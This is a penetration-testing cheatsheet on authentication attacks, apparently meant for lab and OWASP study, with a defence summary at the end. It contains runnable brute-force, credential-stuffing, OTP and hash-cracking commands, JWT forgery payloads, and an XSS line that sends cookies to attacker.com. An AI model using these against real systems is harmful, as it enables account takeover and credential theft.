# Authentication — Complete Cheatsheet
> OWASP Top 10 2025: A07 — Identification and Authentication Failures

---

## 1. What is Authentication?

Authentication is the process of **verifying a user's identity** — confirming that you are who you claim to be. It is the first line of defence for any web application. A flawed authentication mechanism can allow attackers to:

- Bypass login entirely
- Access another user's account
- Escalate privileges to admin
- Take over the entire application

```
Attacker Input  →  Login Endpoint  →  Session Issued
                         ↑
              Target: Exploit this validation step
```

---

## 2. Vulnerability Classes at a Glance

| Vulnerability | Attack Vector | Severity |
|---|---|---|
| Username enumeration | Response/timing differences on login | Medium |
| No rate limiting | Brute force passwords | High |
| Weak password reset token | Predictable/leaked token | Critical |
| MFA bypass | URL jump, OTP brute force | Critical |
| Insecure remember-me cookie | Base64/predictable value forgery | High |
| Session fixation | Pre-set session ID | High |
| JWT none/alg confusion | Token forgery | Critical |
| Credential stuffing | Leaked credential reuse | High |
| Host header injection (reset) | Password reset link hijack | Critical |
| Insecure session cookie | No HttpOnly/Secure flags | Medium |

---

## 3. Username Enumeration

### Via Different Response Messages

```http
POST /login  →  valid user + wrong pass
Response: "Incorrect password"           ← user EXISTS

POST /login  →  invalid user + wrong pass
Response: "Username does not exist"      ← user NOT FOUND
```

### Via Timing Differences

```python
# Valid username takes longer to respond (bcrypt comparison performed)
# Invalid username fails fast (no DB record found)

import requests, time
for user in wordlist:
    t = time.time()
    requests.post('/login', data={'username': user, 'password': 'x'})
    print(user, round(time.time() - t, 3))
```

### Via Registration Page

```
Register with: admin → "Username already taken"  ← admin exists
Register with: xyz99 → "Registered successfully" ← xyz99 is new
```

### Burp Intruder Setup

```
Attack type  : Sniper
Position     : username=§FUZZ§&password=wrong
Payload      : SecLists/Usernames/top-usernames-shortlist.txt
Filter on    : Response length / status code / keyword difference
```

---

## 4. Brute Force Attacks

### Hydra

```bash
# HTTP POST login
hydra -l admin -P rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Credential stuffing (user:pass list)
hydra -C leaked_creds.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:failed"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt target.com http-get /admin
```

### ffuf

```bash
# Password brute force (known username)
ffuf -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200   # filter 200 if failed login stays on same page; use -fc 302 if failed login redirects

# Username enumeration
ffuf -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=x" \
  -w usernames.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 5
```

### Burp Intruder — Cluster Bomb

```
Position 1: username=§USER§
Position 2: password=§PASS§
Payload 1: usernames wordlist
Payload 2: passwords wordlist
Filter: 302 redirect / different length
```

---

## 5. Rate Limiting Bypass

```http
# Rotate IP via header spoofing (Burp Intruder — Pitchfork)
X-Forwarded-For: §1.1.1.1§
X-Real-IP: §1.1.1.1§
X-Originating-IP: §1.1.1.1§

# Payload list: 1.1.1.1, 1.1.1.2, 1.1.1.3 ... (paired with passwords)
```

```python
# Pitchfork payload pairs (position 1 = IP, position 2 = password)
1.1.1.1 → password1
1.1.1.2 → password2
1.1.1.3 → password3
```

---

## 6. "Remember Me" Cookie Forgery

```bash
# Step 1: Login with "remember me" and capture cookie
Cookie: remember_me=dXNlcjoxMjM=

# Step 2: Decode
echo "dXNlcjoxMjM=" | base64 -d
# Output: user:123

# Step 3: Forge for target user (e.g., admin = user:1)
echo -n "user:1" | base64
# Output: dXNlcjox

# Step 4: Replace cookie
Cookie: remember_me=dXNlcjox
# Result: Logged in as user ID 1
```

---

## 7. Password Reset Attacks

### Token Analysis

```bash
# Request reset → intercept email link
# https://target.com/reset?token=abc123def456

# Check token:
# - Is it time-based? (UNIX timestamp in hex/base64)
# - Is it short? (<32 chars → brute forceable)
# - Does it expire after use?

# Brute force (if short)
ffuf -u https://target.com/reset?token=FUZZ \
  -w tokens.txt -fc 404
```

### Host Header Injection

```http
POST /forgot-password HTTP/1.1
Host: attacker.com             ← injected
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Server may generate:
# https://attacker.com/reset?token=abc123
# Victim clicks → token received by attacker
```

### Referer Header Leakage

```
# Reset page loads third-party resources (analytics, fonts)
# Browser sends Referer header to those resources
Referer: https://target.com/reset?token=abc123
# Token exposed to analytics endpoint
```

---

## 8. MFA / 2FA Bypass Techniques

### URL Jump (Logic Bypass)

```
# Normal flow:
POST /login → POST /mfa-verify → GET /dashboard

# Bypass: after step 1, jump directly to:
GET /dashboard
# If server only checks session exists (not MFA complete) → bypassed
```

### OTP Brute Force

```bash
# 4-digit: 10,000 combos
ffuf -u https://target.com/mfa \
  -X POST \
  -d "otp=FUZZ" \
  -w <(seq -w 0 9999) \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302

# 6-digit: 1,000,000 combos (use Burp Intruder → Numbers → 000000–999999)
```

### Backup Code Brute Force

```bash
ffuf -u https://target.com/recovery \
  -X POST \
  -d "code=FUZZ" \
  -w <(seq -w 100000 999999) \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302
```

### TOTP Secret Recovery

```python
# If TOTP QR code URL is accessible
# otpauth://totp/...?secret=BASE32SECRET
# Generate valid OTP:
import pyotp
print(pyotp.TOTP('BASE32SECRET').now())
```

---

## 9. JWT Attacks

### Decode a JWT

```bash
# JWT = header.payload.signature (base64url encoded)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# Use jwt.io or jwt_tool
python3 jwt_tool.py <token>
```

### None Algorithm Attack

```json
// Change header:
{"alg": "none"}

// Remove signature (keep trailing dot):
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### RS256 → HS256 Algorithm Confusion

```bash
# Server uses RS256 (public/private key)
# Attack: switch to HS256 and sign with the public key as the secret

python3 jwt_tool.py <token> -X k -pk public.pem
```

### Weak Secret Brute Force

```bash
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```

### jwks / jku Header Injection

```json
// Change header to point to attacker-controlled JWKS:
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
// Server fetches attacker's public key → verifies attacker-signed token
```

### kid Header Path Traversal / SQL Injection

```json
// kid → key identifier used to look up signing key
{"kid": "../../dev/null"}    // null-byte key → sign with empty string
{"kid": "' UNION SELECT 'attacker_key' --"}  // SQLi in kid lookup
```

---

## 10. Session Attacks

### Session Fixation

```
1. Attacker requests session ID before login:
   GET /login → Set-Cookie: PHPSESSID=attacker_value

2. Attacker sends victim a link with that session ID embedded:
   https://target.com/login?PHPSESSID=attacker_value

3. Victim logs in → server doesn't regenerate session ID

4. Attacker reuses same session ID → now authenticated as victim
```

### Session Hijacking via Cookie Theft

```javascript
// XSS payload to steal cookies
<script>document.location='https://attacker.com/?c='+document.cookie</script>

// If HttpOnly is NOT set → cookie is accessible via JS
// If Secure is NOT set → cookie sent over HTTP → sniffable
```

### Predictable Session ID

```bash
# Test session ID entropy with Burp Sequencer
# Burp → HTTP History → right-click Set-Cookie header → Send to Sequencer
# Sequencer collects and analyses token randomness

# Manually check:
# Short IDs, sequential IDs, base64 of username+timestamp = weak
```

---

## 11. OAuth / SSO Attacks

### Missing State Parameter (CSRF)

```
# OAuth CSRF → link victim's account to attacker's OAuth identity
# Step 1: Start OAuth flow as attacker, capture authorization URL
# Step 2: Before completing, send URL to victim (without state)
# Step 3: Victim clicks → account linked to attacker's identity
```

### Redirect URI Bypass

```
# Registered: https://app.com/callback

# Try bypasses:
https://app.com.attacker.com/callback
https://app.com/callback%40attacker.com
https://app.com/callback/../leak
https://app.com/callback?redirect=https://attacker.com
```

### Leaking Code via Referer

```
# If callback page loads third-party resources:
GET /callback?code=AUTH_CODE
Referer header sent → code leaked to analytics/fonts
```

---

## 12. Credential Stuffing

```bash
# Use breach datasets (HaveIBeenPwned, Dehashed)
# Format: username:password per line

hydra -C creds.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Failed"

# Rotate User-Agent and add delays to avoid detection
hydra -C creds.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Failed" \
  -t 1 -W 3
```

---

## 13. Hash Cracking

```bash
# Identify hash type
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hash-identifier

# Hashcat modes
hashcat -m 0    hash.txt wordlist  # MD5
hashcat -m 100  hash.txt wordlist  # SHA-1
hashcat -m 1400 hash.txt wordlist  # SHA-256
hashcat -m 1800 hash.txt wordlist  # sha512crypt
hashcat -m 3200 hash.txt wordlist  # bcrypt
hashcat -m 16500 token.jwt wordlist # JWT HS256

# With rules (password mutations)
hashcat -m 0 hash.txt wordlist -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=rockyou.txt --format=bcrypt hash.txt
john --show hash.txt
```

---

## 14. Quick Recon Checklist

```
LOGIN PAGE
[ ] Different response for valid vs invalid username?
[ ] Response timing difference?
[ ] Account lockout after N failures?
[ ] CAPTCHA present and bypass-able?
[ ] Is HTTPS enforced? (HTTP should redirect or be disabled)

PASSWORD RESET
[ ] Token entropy — short, predictable, timestamp-based?
[ ] Token expires after use?
[ ] Token expires after time limit?
[ ] Host header injection → link sent to attacker domain?
[ ] Referer header leaks token?

MFA / 2FA
[ ] Can you jump to /dashboard after step 1?
[ ] OTP rate-limited?
[ ] OTP single-use?
[ ] Backup codes rate-limited?
[ ] TOTP secret exposed in QR URL?

SESSION MANAGEMENT
[ ] Burp Sequencer — is token entropy high?
[ ] Cookie has HttpOnly flag?
[ ] Cookie has Secure flag?
[ ] Cookie has SameSite flag?
[ ] Session invalidated on logout?
[ ] Session ID regenerated on login?

REMEMBER ME
[ ] Decode cookie (base64, JWT, hex)?
[ ] Predictable / forgeable?

JWT
[ ] alg: none accepted?
[ ] RS256 → HS256 confusion?
[ ] Weak secret (brute forceable)?
[ ] kid injection (path traversal / SQLi)?
[ ] jku / x5u pointing to attacker domain?
```

---

## 15. Defence Summary

| Control | Implementation |
|---|---|
| Rate limiting | Max 5 failed attempts → lockout or CAPTCHA |
| Password hashing | bcrypt / argon2id (cost factor ≥ 12) |
| Password reset | 128-bit random token, single-use, 15-min expiry |
| MFA | TOTP preferred over SMS; validate at every step |
| Session cookie | `HttpOnly; Secure; SameSite=Strict` |
| Session lifecycle | Regenerate on login, invalidate on logout |
| JWT | Pin algorithm server-side; reject `alg: none` |
| Username enumeration | Uniform messages + uniform response timing |
| Credential stuffing | Check against breach databases (HIBP API) |
| Host header | Validate against allowlist; never use user input |

---

## 16. PortSwigger Labs Quick Reference

| Lab | Technique |
|---|---|
| Username enumeration via different responses | Intruder → Sniper → message diff |
| Username enumeration via subtly different responses | Intruder → grep for subtle word diff |
| Username enumeration via response timing | Intruder + timing analysis |
| Password brute-force via account lockout | Cluster Bomb + rotate IP |
| Broken brute-force protection (IP block) | X-Forwarded-For header rotation |
| Broken brute-force protection (multiple creds) | JSON array of passwords in one request |
| 2FA simple bypass | Jump to /my-account after step 1 |
| 2FA broken logic | Manipulate `verify` cookie to victim username |
| 2FA OTP brute force | Intruder → Numbers 0000–9999 |
| Offline password cracking | Steal "stay-logged-in" cookie → crack MD5 |
| Password reset broken logic | Modify token + username in reset request |
| Password reset via dangling markup | Host header → link sent to attacker |
| Password brute-force via password change | Change password with wrong current → enumeration |

---

*Reference: OWASP Top 10 2025 A07 | PortSwigger Authentication Labs | HackTricks Login Bypass | jwt.io*
